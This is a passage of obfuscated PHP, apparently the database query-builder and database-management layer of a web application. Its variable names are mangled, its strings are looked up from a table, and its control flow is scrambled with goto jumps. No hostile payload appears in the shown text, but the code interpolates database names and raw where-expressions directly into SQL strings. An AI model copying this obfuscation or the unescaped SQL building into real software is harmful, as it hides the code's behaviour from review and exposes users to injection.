(strpos($d¬„ğ‰”…ç, $C”¡Î°Œ•í[281])) { $c¸Ì‹ªÔÊ = explode($C”¡Î°Œ•í[281], $d¬„ğ‰”…ç); $e¬Ô¹ÚĞª« = array(); foreach ($c¸Ì‹ªÔÊ as $E‡àö†×º => $BîÁ‘ŞÖ) { $Bê„Ö†ñßç = $e·†—£Áƒ¾ ? $BÖ¸Î×¢ÀÓ[$E‡àö†×º] : $BÖ¸Î×¢ÀÓ; $e¬Ô¹ÚĞª«[] = $C”¡Î°Œ•í[257] . $this->parseWhereItem($this->parseKey($BîÁ‘ŞÖ), $Bê„Ö†ñßç) . $C”¡Î°Œ•í[865]; } $có¹œ•ƒ¶Â .= implode($C”¡Î°Œ•í[961], $e¬Ô¹ÚĞª«); } else { $có¹œ•ƒ¶Â .= $this->parseWhereItem($this->parseKey($d¬„ğ‰”…ç), $BÖ¸Î×¢ÀÓ); } } $có¹œ•ƒ¶Â .= $C”¡Î°Œ•í[275] . $AÒè‰Úõõ‹; } $có¹œ•ƒ¶Â = substr($có¹œ•ƒ¶Â, 0, -strlen($AÒè‰Úõõ‹)); } return empty($có¹œ•ƒ¶Â) ? $C”¡Î°Œ•í[33] : $C”¡Î°Œ•í[967] . $có¹œ•ƒ¶Â; } protected function parseWhereItem($eÒ‹áì£‡, $DË‰´ô‰õï) { $b¥¬ñ©®ê =& $_SERVER[Ç³Íß¦Ó]; $cÓƒËÃØø§ = $b¥¬ñ©®ê[33]; if (is_array($DË‰´ô‰õï)) { if (is_string($DË‰´ô‰õï[0])) { $c·©Ÿ…¨–Ğ = strtolower($DË‰´ô‰õï[0]); if (in_array($DË‰´ô‰õï[0], array($b¥¬ñ©®ê[951], $b¥¬ñ©®ê[968], $b¥¬ñ©®ê[969], $b¥¬ñ©®ê[970], $b¥¬ñ©®ê[971], $b¥¬ñ©®ê[972]))) { $cÓƒËÃØø§ .= $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $DË‰´ô‰õï[0] . $b¥¬ñ©®ê[50] . $this->parseValue($DË‰´ô‰õï[1]); } elseif (preg_match($b¥¬ñ©®ê[973], $DË‰´ô‰õï[0])) { $cÓƒËÃØø§ .= $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $this->exp[$c·©Ÿ…¨–Ğ] . $b¥¬ñ©®ê[50] . $this->parseValue($DË‰´ô‰õï[1]); } elseif (preg_match($b¥¬ñ©®ê[974], $DË‰´ô‰õï[0])) { if (is_array($DË‰´ô‰õï[1])) { $Aè˜ŸŞÊ²ª = isset($DË‰´ô‰õï[2]) ? strtoupper($DË‰´ô‰õï[2]) : $b¥¬ñ©®ê[959]; if (in_array($Aè˜ŸŞÊ²ª, array($b¥¬ñ©®ê[958], $b¥¬ñ©®ê[959], $b¥¬ñ©®ê[960]))) { $AäîÙ÷•¬± = array(); foreach ($DË‰´ô‰õï[1] as $B‡ÛóÎ‹îÃ) { $AäîÙ÷•¬±[] = $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $this->exp[$c·©Ÿ…¨–Ğ] . $b¥¬ñ©®ê[50] . $this->parseValue($B‡ÛóÎ‹îÃ); } $cÓƒËÃØø§ .= $b¥¬ñ©®ê[257] . implode($b¥¬ñ©®ê[50] . $Aè˜ŸŞÊ²ª . $b¥¬ñ©®ê[50], $AäîÙ÷•¬±) . $b¥¬ñ©®ê[865]; } } else { $cÓƒËÃØø§ .= $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $this->exp[$c·©Ÿ…¨–Ğ] . $b¥¬ñ©®ê[50] . $this->parseValue($DË‰´ô‰õï[1]); } } elseif ($b¥¬ñ©®ê[294] == $c·©Ÿ…¨–Ğ) { $cÓƒËÃØø§ .= $b¥¬ñ©®ê[863] . $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $DË‰´ô‰õï[1] . $b¥¬ñ©®ê[975]; } elseif (preg_match($b¥¬ñ©®ê[976], $DË‰´ô‰õï[0])) { $cÓƒËÃØø§ .= $DË‰´ô‰õï[0]; } elseif (preg_match($b¥¬ñ©®ê[977], $DË‰´ô‰õï[0])) { if (isset($DË‰´ô‰õï[2]) && $b¥¬ñ©®ê[294] == $DË‰´ô‰õï[2]) { $cÓƒËÃØø§ .= $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $this->exp[$c·©Ÿ…¨–Ğ] . $b¥¬ñ©®ê[50] . $DË‰´ô‰õï[1]; } else { if (is_string($DË‰´ô‰õï[1])) { $DË‰´ô‰õï[1] = explode($b¥¬ñ©®ê[47], $DË‰´ô‰õï[1]); } $d„¡¹÷¤¦’ = implode($b¥¬ñ©®ê[47], $this->parseValue($DË‰´ô‰õï[1])); $cÓƒËÃØø§ .= $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $this->exp[$c·©Ÿ…¨–Ğ] . $b¥¬ñ©®ê[863] . $d„¡¹÷¤¦’ . $b¥¬ñ©®ê[865]; } } elseif (preg_match($b¥¬ñ©®ê[978], $DË‰´ô‰õï[0])) { $E§²ĞİÉå¾ = is_string($DË‰´ô‰õï[1]) ? explode($b¥¬ñ©®ê[47], $DË‰´ô‰õï[1]) : $DË‰´ô‰õï[1]; $cÓƒËÃØø§ .= $b¥¬ñ©®ê[863] . $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $this->exp[$c·©Ÿ…¨–Ğ] . $b¥¬ñ©®ê[50] . $this->parseValue($E§²ĞİÉå¾[0]) . $b¥¬ñ©®ê[961] . $this->parseValue($E§²ĞİÉå¾[1]) . $b¥¬ñ©®ê[275]; } else { think_exception(think_lang($b¥¬ñ©®ê[964]) . $b¥¬ñ©®ê[4] . $DË‰´ô‰õï[0]); } } else { $F„æ½¤½ë‰ = count($DË‰´ô‰õï); $BÃøëÔö¾ = $b¥¬ñ©®ê[33]; if (is_string($DË‰´ô‰õï[$F„æ½¤½ë‰ - 1])) { $BÃøëÔö¾ = isset($DË‰´ô‰õï[$F„æ½¤½ë‰ - 1]) ? strtoupper($DË‰´ô‰õï[$F„æ½¤½ë‰ - 1]) : $b¥¬ñ©®ê[33]; if (in_array($BÃøëÔö¾, array($b¥¬ñ©®ê[958], $b¥¬ñ©®ê[959], $b¥¬ñ©®ê[960]))) { $F„æ½¤½ë‰ = $F„æ½¤½ë‰ - 1; } } else { $BÃøëÔö¾ = $b¥¬ñ©®ê[958]; } for ($bÄÌ¦‡’Şê = 0; $bÄÌ¦‡’Şê < $F„æ½¤½ë‰; $bÄÌ¦‡’Şê++) { $E§²ĞİÉå¾ = is_array($DË‰´ô‰õï[$bÄÌ¦‡’Şê]) ? $DË‰´ô‰õï[$bÄÌ¦‡’Şê][1] : $DË‰´ô‰õï[$bÄÌ¦‡’Şê]; if ($b¥¬ñ©®ê[294] == strtolower($DË‰´ô‰õï[$bÄÌ¦‡’Şê][0])) { $cÓƒËÃØø§ .= $b¥¬ñ©®ê[257] . $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $E§²ĞİÉå¾ . $b¥¬ñ©®ê[975] . $BÃøëÔö¾ . $b¥¬ñ©®ê[50]; } else { $C¯ºŞêÎİª = is_array($DË‰´ô‰õï[$bÄÌ¦‡’Şê]) ? $this->exp[strtolower($DË‰´ô‰õï[$bÄÌ¦‡’Şê][0])] : $b¥¬ñ©®ê[951]; if (!$C¯ºŞêÎİª && is_array($DË‰´ô‰õï[$bÄÌ¦‡’Şê]) && in_array($DË‰´ô‰õï[$bÄÌ¦‡’Şê][0], array($b¥¬ñ©®ê[951], $b¥¬ñ©®ê[968], $b¥¬ñ©®ê[969], $b¥¬ñ©®ê[970], $b¥¬ñ©®ê[971], $b¥¬ñ©®ê[972]))) { $C¯ºŞêÎİª = $DË‰´ô‰õï[$bÄÌ¦‡’Şê][0]; } $cÓƒËÃØø§ .= $b¥¬ñ©®ê[257] . $eÒ‹áì£‡ . $b¥¬ñ©®ê[50] . $C¯ºŞêÎİª . $b¥¬ñ©®ê[50] . $this->parseValue($E§²ĞİÉå¾) . $b¥¬ñ©®ê[975] . $BÃøëÔö¾ . $b¥¬ñ©®ê[50]; } } $cÓƒËÃØø§ = substr($cÓƒËÃØø§, 0, -4); } } else { $cÓƒËÃØø§ .= $eÒ‹áì£‡ . $b¥¬ñ©®ê[979] . $this->parseValue($DË‰´ô‰õï); } return $cÓƒËÃØø§; } protected function parseThinkWhere($B„ç³îÔ™, $bƒÇÔ‹¢‹) { $D›‰Ì£ˆ¨ï =& $_SERVER[Ç³Íß¦Ó]; $d´Ò„£òÀˆ = $D›‰Ì£ˆ¨ï[33]; switch ($B„ç³îÔ™) { case $D›‰Ì£ˆ¨ï[349]: $d´Ò„£òÀˆ = $bƒÇÔ‹¢‹; break; case $D›‰Ì£ˆ¨ï[962]: $d´Ò„£òÀˆ = is_string($bƒÇÔ‹¢‹) ? $bƒÇÔ‹¢‹ : substr($this->parseWhere($bƒÇÔ‹¢‹), 6); break; case $D›‰Ì£ˆ¨ï[980]: parse_str($bƒÇÔ‹¢‹, $døñŠŠÄ¤ã); if (isset($døñŠŠÄ¤ã[$D›‰Ì£ˆ¨ï[957]])) { $b´ÛŸ¶è‹Í = $D›‰Ì£ˆ¨ï[50] . strtoupper($døñŠŠÄ¤ã[$D›‰Ì£ˆ¨ï[957]]) . $D›‰Ì£ˆ¨ï[50]; unset($døñŠŠÄ¤ã[$D›‰Ì£ˆ¨ï[957]]); } else { $b´ÛŸ¶è‹Í = $D›‰Ì£ˆ¨ï[961]; } $fŠÈìæğ»Á = array(); foreach ($døñŠŠÄ¤ã as $D÷©‰ => $f”Ê®÷º˜) { $fŠÈìæğ»Á[] = $this->parseKey($D÷©‰) . $D›‰Ì£ˆ¨ï[979] . $this->parseValue($f”Ê®÷º˜); } $d´Ò„£òÀˆ = implode($b´ÛŸ¶è‹Í, $fŠÈìæğ»Á); break; } return $d´Ò„£òÀˆ; } protected function parseLimit($F•Ş³ÏÏ­Ü) { $B¾÷çä–ÎÔ =& $_SERVER[Ç³Íß¦Ó]; return !empty($F•Ş³ÏÏ­Ü) ? $B¾÷çä–ÎÔ[48] . $F•Ş³ÏÏ­Ü . $B¾÷çä–ÎÔ[50] : $B¾÷çä–ÎÔ[33]; } protected function parseJoin($fÕ›®äµ) { $c¥ôóø«ƒ¯ =& $_SERVER[Ç³Íß¦Ó]; $fØ…¦óí»ì = $c¥ôóø«ƒ¯[33]; if (!empty($fÕ›®äµ)) { if (is_array($fÕ›®äµ)) { foreach ($fÕ›®äµ as $B›ˆ¹ë·Ôå => $D–Çó•Ìæ…) { if (!1 !== stripos($D–Çó•Ìæ…, $c¥ôóø«ƒ¯[981])) { $fØ…¦óí»ì .= $c¥ôóø«ƒ¯[50] . $D–Çó•Ìæ…; } else { $fØ…¦óí»ì .= $c¥ôóø«ƒ¯[982] . $D–Çó•Ìæ…; } } } else { $fØ…¦óí»ì .= $c¥ôóø«ƒ¯[982] . $fÕ›®äµ; } } $fØ…¦óí»ì = preg_replace($c¥ôóø«ƒ¯[983], think_config($c¥ôóø«ƒ¯[889]) . $c¥ôóø«ƒ¯[984], $fØ…¦óí»ì); return $fØ…¦óí»ì; } protected function parseOrder($cìéŠäÎÛ±) { $F•ùÕ™Í°Ñ =& $_SERVER[Ç³Íß¦Ó]; if (is_array($cìéŠäÎÛ±)) { $cÔíªˆøç± = array(); foreach ($cìéŠäÎÛ± as $eáÈÛ«¦ì => $EÖ×‘–ô¤¥) { if (is_numeric($eáÈÛ«¦ì)) { $cÔíªˆøç±[] = $this->parseKey($EÖ×‘–ô¤¥); } else { $EÖ×‘–ô¤¥ = in_array(strtoupper(trim($EÖ×‘–ô¤¥)), array($F•ùÕ™Í°Ñ[985], $F•ùÕ™Í°Ñ[986])) ? $F•ùÕ™Í°Ñ[50] . $EÖ×‘–ô¤¥ : $F•ùÕ™Í°Ñ[33]; if (preg_match($F•ùÕ™Í°Ñ[987], $eáÈÛ«¦ì)) { $cÔíªˆøç±[] = $this->parseKey($eáÈÛ«¦ì) . $EÖ×‘–ô¤¥; } else { think_exception($F•ùÕ™Í°Ñ[988] . $eáÈÛ«¦ì); } } } $cìéŠäÎÛ± = implode($F•ùÕ™Í°Ñ[47], $cÔíªˆøç±); } return !empty($cìéŠäÎÛ±) ? $F•ùÕ™Í°Ñ[989] . $cìéŠäÎÛ± : $F•ùÕ™Í°Ñ[33]; } protected function parseGroup($FöÆğÃ‰ß÷) { $fˆêÎëğÖ =& $_SERVER[Ç³Íß¦Ó]; return !empty($FöÆğÃ‰ß÷) ? $fˆêÎëğÖ[990] . $FöÆğÃ‰ß÷ : $fˆêÎëğÖ[33]; } protected function parseHaving($aë‘ãµĞ‹ ) { $fÁ±ó°â™À =& $_SERVER[Ç³Íß¦Ó]; return !empty($aë‘ãµĞ‹ ) ? $fÁ±ó°â™À[991] . $aë‘ãµĞ‹  : $fÁ±ó°â™À[33]; } protected function parseComment($D“¼Úğ’¯×) { $CËêïõšø‡ =& $_SERVER[Ç³Íß¦Ó]; return !empty($D“¼Úğ’¯×) ? $CËêïõšø‡[992] . $D“¼Úğ’¯× . $CËêïõšø‡[993] : $CËêïõšø‡[33]; } protected function parseDistinct($DÍ®©¨óö) { $f¶ïÙ¹Êù =& $_SERVER[Ç³Íß¦Ó]; return !empty($DÍ®©¨óö) ? $f¶ïÙ¹Êù[994] : $f¶ïÙ¹Êù[33]; } protected function parseUnion($A·ôòº”È) { $CôÖØØ¥ =& $_SERVER[Ç³Íß¦Ó]; if (empty($A·ôòº”È)) { return $CôÖØØ¥[33]; } if (isset($A·ôòº”È[$CôÖØØ¥[345]])) { $dğÅéºÄåâ = $CôÖØØ¥[995]; unset($A·ôòº”È[$CôÖØØ¥[345]]); } else { $dğÅéºÄåâ = $CôÖØØ¥[996]; } foreach ($A·ôòº”È as $e­¢¶šğ÷„) { $BšêÓÏÅ®[] = $dğÅéºÄåâ . (is_array($e­¢¶šğ÷„) ? $this->buildSelectSql($e­¢¶šğ÷„) : $e­¢¶šğ÷„); } return implode($CôÖØØ¥[50], $BšêÓÏÅ®); } public function insert($DĞŸ­ÛèÜº, $fáù¸¢•óà = array(), $bÈ°•Ñ›â§ = false) { goto E¯Ğ¸˜¼›È; eèªæÙ‹Ñ: foreach ($DĞŸ­ÛèÜº as $AªÕç—Ó¸Š => $CÎêæŒ„ø) { if (is_array($CÎêæŒ„ø) && $e»èğØò¡[294] == $CÎêæŒ„ø[0]) { $DÉãÎ¾İŒå[] = $this->parseKey($AªÕç—Ó¸Š); $aò¡¯¢‰Š¨[] = $CÎêæŒ„ø[1]; } elseif (is_scalar($CÎêæŒ„ø) || is_null($CÎêæŒ„ø)) { $DÉãÎ¾İŒå[] = $this->parseKey($AªÕç—Ó¸Š); $aò¡¯¢‰Š¨[] = $this->parseValue($CÎêæŒ„ø); } } $F¢·–Ğ¥¤Ï = ($bÈ°•Ñ›â§ ? $e»èğØò¡[867] : $e»èğØò¡[868]) . $e»èğØò¡[869] . $this->parseTable($fáù¸¢•óà[$e»èğØò¡[276]]) . $e»èğØò¡[863] . implode($e»èğØò¡[47], $DÉãÎ¾İŒå) . $e»èğØò¡[864] . implode($e»èğØò¡[47], $aò¡¯¢‰Š¨) . $e»èğØò¡[865]; $F¢·–Ğ¥¤Ï .= $this->parseLock(isset($fáù¸¢•óà[$e»èğØò¡[813]]) ? $fáù¸¢•óà[$e»èğØò¡[813]] : !1); goto fß£–Ú˜Ã; E¯Ğ¸˜¼›È: $e»èğØò¡ =& $_SERVER[Ç³Íß¦Ó]; $aò¡¯¢‰Š¨ = $DÉãÎ¾İŒå = array(); $this->model = $fáù¸¢•óà[$e»èğØò¡[278]]; goto eèªæÙ‹Ñ; fß£–Ú˜Ã: $F¢·–Ğ¥¤Ï .= $this->parseComment(!empty($fáù¸¢•óà[$e»èğØò¡[351]]) ? $fáù¸¢•óà[$e»èğØò¡[351]] : $e»èğØò¡[33]); return $this->execute($F¢·–Ğ¥¤Ï, $this->parseBind(!empty($fáù¸¢•óà[$e»èğØò¡[282]]) ? $fáù¸¢•óà[$e»èğØò¡[282]] : array())); goto bš‚ï¿æ²­; bš‚ï¿æ²­: } public function selectInsert($CÇöÇ³ˆ¥ä, $FÀÚÏŠ·Õì, $CÔŠ„ç…ˆ´ = array()) { goto A…ò˜Ÿ¾¸; A…ò˜Ÿ¾¸: $C‡ô›ø©ï =& $_SERVER[Ç³Íß¦Ó]; $this->model = $CÔŠ„ç…ˆ´[$C‡ô›ø©ï[278]]; if (is_string($CÇöÇ³ˆ¥ä)) { $CÇöÇ³ˆ¥ä = explode($C‡ô›ø©ï[47], $CÇöÇ³ˆ¥ä); } goto AåÉ¨à†ªÎ; CØŞ ÔöÏ¶: return $this->execute($dè½ˆ°¨Å¿, $this->parseBind(!empty($CÔŠ„ç…ˆ´[$C‡ô›ø©ï[282]]) ? $CÔŠ„ç…ˆ´[$C‡ô›ø©ï[282]] : array())); goto f‰”Ú“£; AåÉ¨à†ªÎ: array_walk($CÇöÇ³ˆ¥ä, array($this, $C‡ô›ø©ï[866])); $dè½ˆ°¨Å¿ = $C‡ô›ø©ï[997] . $this->parseTable($FÀÚÏŠ·Õì) . $C‡ô›ø©ï[863] . implode($C‡ô›ø©ï[47], $CÇöÇ³ˆ¥ä) . $C‡ô›ø©ï[975]; $dè½ˆ°¨Å¿ .= $this->buildSelectSql($CÔŠ„ç…ˆ´); goto CØŞ ÔöÏ¶; f‰”Ú“£: } public function update($AËµÍª¨…Ñ, $D‡¥Á¡´ Ó) { $cêôƒ¥Ó£î =& $_SERVER[Ç³Íß¦Ó]; $this->model = $D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[278]]; $E¹Áî¡äá£ = $cêôƒ¥Ó£î[998] . $this->parseTable($D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[276]]) . $this->parseSet($AËµÍª¨…Ñ) . $this->parseWhere(!empty($D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[272]]) ? $D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[272]] : $cêôƒ¥Ó£î[33]) . $this->parseOrder(!empty($D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[362]]) ? $D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[362]] : $cêôƒ¥Ó£î[33]) . $this->parseLimit(!empty($D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[289]]) ? $D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[289]] : $cêôƒ¥Ó£î[33]) . $this->parseLock(isset($D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[813]]) ? $D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[813]] : !1) . $this->parseComment(!empty($D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[351]]) ? $D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[351]] : $cêôƒ¥Ó£î[33]); return $this->execute($E¹Áî¡äá£, $this->parseBind(!empty($D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[282]]) ? $D‡¥Á¡´ Ó[$cêôƒ¥Ó£î[282]] : array())); } public function delete($AŒŞÈšÄÕ = array()) { $fˆ‡ëÎïÊÍ =& $_SERVER[Ç³Íß¦Ó]; $this->model = $AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[278]]; $aóĞËİã = $fˆ‡ëÎïÊÍ[999] . $this->parseTable($AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[276]]) . $this->parseWhere(!empty($AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[272]]) ? $AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[272]] : $fˆ‡ëÎïÊÍ[33]) . $this->parseOrder(!empty($AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[362]]) ? $AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[362]] : $fˆ‡ëÎïÊÍ[33]) . $this->parseLimit(!empty($AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[289]]) ? $AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[289]] : $fˆ‡ëÎïÊÍ[33]) . $this->parseLock(isset($AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[813]]) ? $AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[813]] : !1) . $this->parseComment(!empty($AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[351]]) ? $AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[351]] : $fˆ‡ëÎïÊÍ[33]); return $this->execute($aóĞËİã, $this->parseBind(!empty($AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[282]]) ? $AŒŞÈšÄÕ[$fˆ‡ëÎïÊÍ[282]] : array())); } public function select($BÕ°šİóË  = array()) { goto bš±£¹Ê™ç; cÊöğå¼‘÷: if ($f­˜¨ÊÛšİ && !1 !== $dÏß×±åä¦) { think_cache($a­‡™ÈÕ, $dÏß×±åä¦, $f­˜¨ÊÛšİ); } return $dÏß×±åä¦; goto d‚Í¦È¿İ™; B·Øñ•ñ“˜: $f­˜¨ÊÛšİ = isset($BÕ°šİóË [$BïÕÌ®¬Š‚[346]]) ? $BÕ°šİóË [$BïÕÌ®¬Š‚[346]] : !1; if ($f­˜¨ÊÛšİ) { $a­‡™ÈÕ = is_string($f­˜¨ÊÛšİ[$BïÕÌ®¬Š‚[93]]) ? $f­˜¨ÊÛšİ[$BïÕÌ®¬Š‚[93]] : $BïÕÌ®¬Š‚[1000] . md5($C‰ÎÇíœèÒ); $fë’¨Œˆ¢ = think_cache($a­‡™ÈÕ, $BïÕÌ®¬Š‚[33], $f­˜¨ÊÛšİ); if (!1 !== $fë’¨Œˆ¢) { return $fë’¨Œˆ¢; } } $dÏß×±åä¦ = $this->query($C‰ÎÇíœèÒ, $this->parseBind(!empty($BÕ°šİóË [$BïÕÌ®¬Š‚[282]]) ? $BÕ°šİóË [$BïÕÌ®¬Š‚[282]] : array())); goto cÊöğå¼‘÷; bš±£¹Ê™ç: $BïÕÌ®¬Š‚ =& $_SERVER[Ç³Íß¦Ó]; $this->model = $BÕ°šİóË [$BïÕÌ®¬Š‚[278]]; $C‰ÎÇíœèÒ = $this->buildSelectSql($BÕ°šİóË ); goto B·Øñ•ñ“˜; d‚Í¦È¿İ™: } public function buildSelectSql($e®çšÙì¤å = array()) { goto C¹Ë¸Í’õÏ; B…äÍİÂ®î: $f¦‚í˜ŞŒ = $this->parseSql($this->selectSql, $e®çšÙì¤å); $f¦‚í˜ŞŒ .= $this->parseLock(isset($e®çšÙì¤å[$FéŒœÄ†•²[813]]) ? $e®çšÙì¤å[$FéŒœÄ†•²[813]] : !1); if (isset($A›”‘ƒº¹µ)) { think_cache($A›”‘ƒº¹µ, $f¦‚í˜ŞŒ); } goto fùâå»¢„; C¹Ë¸Í’õÏ: $FéŒœÄ†•² =& $_SERVER[Ç³Íß¦Ó]; if (isset($e®çšÙì¤å[$FéŒœÄ†•²[350]])) { if (strpos($e®çšÙì¤å[$FéŒœÄ†•²[350]], $FéŒœÄ†•²[47])) { list($bÁÉ¦‹Ñµ¥, $F…ø·…°ç) = explode($FéŒœÄ†•²[47], $e®çšÙì¤å[$FéŒœÄ†•²[350]]); } else { $bÁÉ¦‹Ñµ¥ = $e®çšÙì¤å[$FéŒœÄ†•²[350]]; } $bÁÉ¦‹Ñµ¥ = $bÁÉ¦‹Ñµ¥ ? $bÁÉ¦‹Ñµ¥ : 1; $F…ø·…°ç = isset($F…ø·…°ç) ? $F…ø·…°ç : (is_numeric($e®çšÙì¤å[$FéŒœÄ†•²[289]]) ? $e®çšÙì¤å[$FéŒœÄ†•²[289]] : 20); $dò©ªŒòİ = $F…ø·…°ç * ((int) $bÁÉ¦‹Ñµ¥ - 1); $e®çšÙì¤å[$FéŒœÄ†•²[289]] = $dò©ªŒòİ . $FéŒœÄ†•²[47] . $F…ø·…°ç; } if (think_config($FéŒœÄ†•²[1001])) { $A›”‘ƒº¹µ = $FéŒœÄ†•²[1002] . md5(serialize($e®çšÙì¤å)); $Cê¡ÆµÓÜÅ = think_cache($A›”‘ƒº¹µ); if ($Cê¡ÆµÓÜÅ) { return $Cê¡ÆµÓÜÅ; } } goto B…äÍİÂ®î; fùâå»¢„: return $f¦‚í˜ŞŒ; goto d°óâÓ¾§; d°óâÓ¾§: } public function parseSql($cï…­š÷Ç´, $e™©ˆ½çå™ = array()) { $b¬šÏ» =& $_SERVER[Ç³Íß¦Ó]; $cï…­š÷Ç´ = str_replace(array($b¬šÏ»[1003], $b¬šÏ»[1004], $b¬šÏ»[1005], $b¬šÏ»[1006], $b¬šÏ»[1007], $b¬šÏ»[1008], $b¬šÏ»[1009], $b¬šÏ»[1010], $b¬šÏ»[1011], $b¬šÏ»[1012], $b¬šÏ»[1013]), array($this->parseTable("{$e™©ˆ½çå™[$b¬šÏ»[276]]}"), $this->parseDistinct(isset($e™©ˆ½çå™[$b¬šÏ»[1014]]) ? $e™©ˆ½çå™[$b¬šÏ»[1014]] : !1), $this->parseField(!empty($e™©ˆ½çå™[$b¬šÏ»[270]]) ? $e™©ˆ½çå™[$b¬šÏ»[270]] : $b¬šÏ»[182]), $this->parseJoin(!empty($e™©ˆ½çå™[$b¬šÏ»[279]]) ? $e™©ˆ½çå™[$b¬šÏ»[279]] : $b¬šÏ»[33]), $this->parseWhere(!empty($e™©ˆ½çå™[$b¬šÏ»[272]]) ? $e™©ˆ½çå™[$b¬šÏ»[272]] : $b¬šÏ»[33]), $this->parseGroup(!empty($e™©ˆ½çå™[$b¬šÏ»[1015]]) ? $e™©ˆ½çå™[$b¬šÏ»[1015]] : $b¬šÏ»[33]), $this->parseHaving(!empty($e™©ˆ½çå™[$b¬šÏ»[1016]]) ? $e™©ˆ½çå™[$b¬šÏ»[1016]] : $b¬šÏ»[33]), $this->parseOrder(!empty($e™©ˆ½çå™[$b¬šÏ»[362]]) ? $e™©ˆ½çå™[$b¬šÏ»[362]] : $b¬šÏ»[33]), $this->parseLimit(!empty($e™©ˆ½çå™[$b¬šÏ»[289]]) ? $e™©ˆ½çå™[$b¬šÏ»[289]] : $b¬šÏ»[33]), $this->parseUnion(!empty($e™©ˆ½çå™[$b¬šÏ»[344]]) ? $e™©ˆ½çå™[$b¬šÏ»[344]] : $b¬šÏ»[33]), $this->parseComment(!empty($e™©ˆ½çå™[$b¬šÏ»[351]]) ? $e™©ˆ½çå™[$b¬šÏ»[351]] : $b¬šÏ»[33])), $cï…­š÷Ç´); return $cï…­š÷Ç´; } public function getLastSql($EŒŒªÒĞ¹§ = '') { return $EŒŒªÒĞ¹§ ? $this->modelSql[$EŒŒªÒĞ¹§] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($bíï æ‹ÙØ) { return addslashes($bíï æ‹ÙØ); } public function setModel($a”¡¯Úº) { $this->model = $a”¡¯Úº; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($dˆ…Œ‚Èóì, $DŠ¦ïé‹‹ğ = '') { $this->database = $dˆ…Œ‚Èóì; $this->type = $DŠ¦ïé‹‹ğ; } public function model($e£ó¼£¥ÔÈ = '') { return new ModelBase($e£ó¼£¥ÔÈ, $_SERVER[Ç³Íß¦Ó][33], $this->database); } public function db($bÕ³Şò˜Áá = false) { goto Eíª¥éÖÆ; cóË•Ê”­©: $this->database = $A¬À¸—»; $C«óÛƒã  = $this->model()->db(); try { $CÓ·œÙÇÇ = $C«óÛƒã ->execute("\x73\x68\x6f\x77\x20\144\x61\x74\141\142\x61\163\145\x73\x20\154\151\153\x65\x20\x27{$e¡è½´¶ ò}\x27"); } catch (Exception $D‰ºõÁæ´˜) { } goto A†“•ªá; FŸÅÛŠ­§ƒ: $this->database = $A¬À¸—»; $C«óÛƒã ->execute("\x75\163\x65\x20\140{$e¡è½´¶ ò}\140"); return $C«óÛƒã ; goto FÂ«‹óô; CÔ–©ÂÛ©í: $e¡è½´¶ ò = $A¬À¸—»[$eáÌ»«ÇĞ[929]]; $A¬À¸—»[$eáÌ»«ÇĞ[929]] = $eáÌ»«ÇĞ[33]; if ($A¬À¸—»[$eáÌ»«ÇĞ[755]] == $eáÌ»«ÇĞ[756]) { $a’•óù„à = $A¬À¸—»[$eáÌ»«ÇĞ[757]]; $A¬À¸—»[$eáÌ»«ÇĞ[757]] = substr($a’•óù„à, 0, strrpos($a’•óù„à, $eáÌ»«ÇĞ[1017])); } goto cóË•Ê”­©; Eíª¥éÖÆ: $eáÌ»«ÇĞ =& $_SERVER[Ç³Íß¦Ó]; $A¬À¸—» = array_change_key_case($this->database); if ($this->type == $eáÌ»«ÇĞ[9] || !$bÕ³Şò˜Áá) { return $this->model()->db(); } goto CÔ–©ÂÛ©í; A†“•ªá: if (!$CÓ·œÙÇÇ) { $C«óÛƒã ->execute("\143\162\x65\x61\x74\x65\x20\144\x61\164\141\x62\141\x73\145\x20\x60{$e¡è½´¶ ò}\x60"); } $A¬À¸—»[$eáÌ»«ÇĞ[929]] = $e¡è½´¶ ò; if ($A¬À¸—»[$eáÌ»«ÇĞ[755]] == $eáÌ»«ÇĞ[756]) { $A¬À¸—»[$eáÌ»«ÇĞ[757]] .= $eáÌ»«ÇĞ[1017] . $e¡è½´¶ ò; } goto FŸÅÛŠ­§ƒ; FÂ«‹óô: } public function createTable($Cë’í»Ü, $fÊáìºÇ»Ü = null) { $F¬©Ü±æ–¢ =& $_SERVER[Ç³Íß¦Ó]; if (!IO::exist($Cë’í»Ü)) { ActionCall($F¬©Ü±æ–¢[1018], !0, 0); show_json(LNG($F¬©Ü±æ–¢[1019]), !1); } $dÌà±†Ç”î = sqlSplit(IO::getContent($Cë’í»Ü)); foreach ($dÌà±†Ç”î as 